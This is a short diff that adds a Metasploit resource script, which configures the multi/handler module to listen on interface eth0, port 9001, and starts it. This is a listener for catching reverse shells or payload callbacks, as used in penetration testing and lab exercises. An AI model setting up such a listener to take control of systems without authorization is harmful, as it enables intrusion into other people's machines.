@@ -1,0 +1,4 @@
+use exploit/multi/handler
+set LHOST eth0 
+set LPORT 9001
+exploit
